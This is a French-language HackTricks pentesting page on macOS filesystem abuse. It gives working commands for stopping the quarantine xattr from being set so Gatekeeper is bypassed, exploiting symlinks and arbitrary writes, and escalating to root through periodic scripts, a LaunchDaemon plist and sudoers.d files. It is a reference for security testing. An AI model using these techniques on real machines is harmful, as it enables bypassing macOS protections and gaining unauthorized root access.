# Astuces pour le système de fichiers macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Combinaisons de permissions POSIX

Permissions dans un **répertoire** :

* **lecture** - vous pouvez **énumérer** les entrées du répertoire
* **écriture** - vous pouvez **supprimer/écrire** des fichiers dans le répertoire
* **exécution** - vous êtes **autorisé à traverser** le répertoire - si vous n'avez pas ce droit, vous ne pouvez pas accéder aux fichiers à l'intérieur, ni à aucun sous-répertoire.

### Combinaisons dangereuses

**Comment écraser un fichier/dossier appartenant à root**, mais :

* Le propriétaire d'un **répertoire parent** dans le chemin est l'utilisateur
* Le propriétaire d'un **répertoire parent** dans le chemin est un **groupe d'utilisateurs** avec un **accès en écriture**
* Un **groupe d'utilisateurs** a un **accès en écriture** au **fichier**

Avec l'une de ces combinaisons, un attaquant pourrait **injecter** un **lien sym/hard** dans le chemin attendu pour obtenir une écriture arbitraire avec des privilèges.

### Cas spécial du répertoire racine R+X

Si des fichiers se trouvent dans un **répertoire** où **seul root a un accès R+X**, ceux-ci ne sont **pas accessibles aux autres**. Ainsi, une vulnérabilité permettant de **déplacer un fichier lisible par un utilisateur**, qui ne peut pas être lu en raison de cette **restriction**, de ce répertoire **vers un autre**, pourrait être exploitée pour lire ces fichiers.

Exemple ici : [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Lien symbolique / Lien physique

Si un processus privilégié écrit des données dans un **fichier** qui peut être **contrôlé** par un utilisateur moins privilégié, ou qui peut avoir été **précédemment créé** par un utilisateur moins privilégié. L'utilisateur peut simplement le **rediriger vers un autre fichier** via un lien symbolique ou physique, et le processus privilégié écrira sur ce fichier.

Vérifiez dans les autres sections où un attaquant pourrait **exploiter une écriture arbitraire pour escalader les privilèges**.

## Descripteur de fichier arbitraire

Si vous pouvez faire en sorte qu'un **processus ouvre un fichier ou un répertoire avec des privilèges élevés**, vous pouvez exploiter **`crontab`** pour ouvrir un fichier dans `/etc/sudoers.d` avec **`EDITOR=exploit.py`**, ainsi `exploit.py` obtiendra le descripteur de fichier du fichier à l'intérieur de `/etc/sudoers` et l'exploiter.

Par exemple : [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Astuces pour éviter les attributs de quarantaine xattrs

### Drapeau uchg / uchange / uimmutable

Si un fichier/répertoire a cet attribut immuable, il ne sera pas possible d'y mettre un xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montage defvfs

Un montage **defvfs** **ne prend pas en charge les xattr**, plus d'informations dans [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### ACL writeextattr

Cet ACL empêche l'ajout de `xattrs` au fichier.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Le format de fichier **AppleDouble** copie un fichier y compris ses ACEs.

Dans le [**code source**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), il est possible de voir que la représentation textuelle ACL stockée à l'intérieur de l'xattr appelé **`com.apple.acl.text`** sera définie comme ACL dans le fichier décompressé. Ainsi, si vous compressez une application dans un fichier zip avec le format de fichier **AppleDouble** avec une ACL qui empêche l'écriture d'autres xattrs dessus... l'xattr de quarantaine ne sera pas défini dans l'application :

Consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) pour plus d'informations.

Pour reproduire cela, nous devons d'abord obtenir la chaîne d'ACL correcte :
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Notez que même si cela fonctionne, le bac à sable écrit l'attribut étendu de quarantaine avant)

Pas vraiment nécessaire mais je le laisse là au cas où:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Contourner les signatures de code

Les bundles contiennent le fichier **`_CodeSignature/CodeResources`** qui contient le **hash** de chaque **fichier** dans le **bundle**. Notez que le hash de CodeResources est également **incorporé dans l'exécutable**, donc nous ne pouvons pas y toucher non plus.

Cependant, il existe certains fichiers dont la signature ne sera pas vérifiée, ceux-ci ont la clé "omit" dans la plist, comme suit:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
## Monter des fichiers DMG

Un utilisateur peut monter un fichier DMG personnalisé même par-dessus certains dossiers existants. Voici comment vous pouvez créer un package DMG personnalisé avec un contenu personnalisé :

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote
```
{% endcode %}

## Écritures arbitraires

### Scripts sh périodiques

Si votre script peut être interprété comme un **script shell**, vous pouvez écraser le script shell **`/etc/periodic/daily/999.local`** qui sera déclenché tous les jours.

Vous pouvez **simuler** l'exécution de ce script avec la commande : **`sudo periodic daily`**

### Daemons

Écrivez un **LaunchDaemon** arbitraire tel que **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** avec un plist exécutant un script arbitraire comme suit :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Générez simplement le script `/Applications/Scripts/privesc.sh` avec les **commandes** que vous souhaitez exécuter en tant que root.

### Fichier Sudoers

Si vous avez la possibilité d'écrire arbitrairement, vous pouvez créer un fichier dans le dossier **`/etc/sudoers.d/`** vous accordant des privilèges **sudo**.

## Références

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
